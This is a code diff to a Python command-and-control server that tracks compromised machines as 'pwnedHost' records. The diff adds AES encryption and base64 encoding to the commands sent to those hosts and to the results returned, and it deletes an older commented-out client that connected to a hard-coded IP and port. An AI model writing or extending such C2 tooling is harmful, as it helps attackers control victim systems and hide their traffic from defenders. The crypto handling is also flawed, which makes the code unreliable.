@@ -1,15 +1,28 @@
-import socket
-import sys
+from Crypto.Cipher import AES
 import time
-import threading
 from command_control.models import pwnedHost
-from multiprocessing import Process
+import socket
+import base64
+import os
 
 
-def create_socket(user, interface, port):
+BLOCK_SIZE = 32
+PADDING = '{'
+pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
+EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
+DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))
+iv = os.urandom(16)
+
+
+def create_socket(user, interface, port, encryption_key):
     try:
         global s
+        global sock
         global author
+        global secret
+        global cipher
+        secret = encryption_key
+        cipher = AES.new(secret, AES.MODE_CFB, iv)
         interface = interface
         port = port
         author = user
@@ -29,6 +42,7 @@ def sock_connect():
     try:
         connect, ip_addr = s.accept()
         print("connection from %s:%s \n" % (ip_addr[0], ip_addr[1]))
+        print("\n")
         user = connect.recv(1024)
         host = pwnedHost(author= author, ip=ip_addr[0], port=ip_addr[1], username= user)
         host.save()
@@ -39,60 +53,13 @@ def sock_connect():
 def command_control(command, id, ip_address):
     host = pwnedHost.objects.get(id=id, ip=ip_address)
     try:
-        connect.sendto(command.encode(),(host.ip,host.port))
+        encrypted = EncodeAES(cipher, command)
+        connect.sendto(encrypted,(host.ip,host.port))
+        result = connect.recv(16384)
+        return DecodeAES(cipher,result)
     except:
         host.delete()
-    result = connect.recv(16384)
-    return result
 
 
-"""
-import socket
-import ssl
-from encrypt import *
-import pickle
-
-
-def connect(command_to_run, ip):
-    try:
-        global host
-        global port
-        global s
-        global sock
-        global result
-        global command
-
-        command = command_to_run
-
-        host = '172.16.69.132'
-        # host = ''
-        port = 9999
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        # s = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLSv1)
-        print("Trying to Connect")
-        s.connect((host, port))
-        print("Connection Established")
-        knock = encrypt_message()
-        s.send(pickle.dumps(knock))
-        time.sleep(1)
-        return receive()
-    except socket.error as msg:
-        return "socket error : " + str(msg[0])
-
-
-def receive():
-    if command == 'quit' or command == 'exit':
-        s.close()
-    else:
-        return send(command)
-
-
-def send(args):
-    s.send(args)
-    result = s.recv(16384)
-    print(result)
-    s.close()
-    return str(result)
-"""
 
 
